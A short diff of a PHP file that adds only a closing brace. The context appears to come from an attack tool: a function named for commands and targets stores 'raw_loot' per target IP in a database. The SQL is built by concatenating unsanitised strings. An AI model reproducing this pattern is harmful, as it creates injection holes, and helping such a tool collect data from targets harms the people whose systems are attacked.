@@ -1997,6 +1997,7 @@ function __command($commando, $alvo) {
         if($result123){
 echo $Q = 'update BigDump set raw_loot = raw_loot || " | " || "'.htmlspecialchars_decode(stripslashes(str_replace('(','|',str_replace('(','|',$result123))),ENT_NOQUOTES).'" where ip ="'.$TARGETIP.'";';
           $db->query($Q);
+        }
         echo $_SESSION["c0"];
     }
     if (empty($dados[0])) {
